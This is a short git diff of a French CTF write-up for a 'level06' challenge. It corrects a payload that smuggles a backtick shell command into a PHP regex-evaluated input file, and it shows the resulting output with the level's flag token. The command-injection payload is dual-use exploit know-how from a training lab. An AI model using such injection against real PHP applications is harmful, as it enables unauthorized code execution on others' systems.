@@ -44,7 +44,7 @@ echo '[ x `getflag`]' > /tmp/get; ./level06 /tmp/get
 ${`cmd`} permet de substituer la string au resultat de cmd.
 
 - on modifie l'expression pour qu'il exécute correctement:
-echo '[ x ${`getflag`}' > /tmp/get ; ./level06 /tmp/get
+echo '[x ${`getflag`}]' > /tmp/get; ./level06 /tmp/get
     -> PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
        in /home/user/level06/level06.php(4) : regexp code on line 1
 
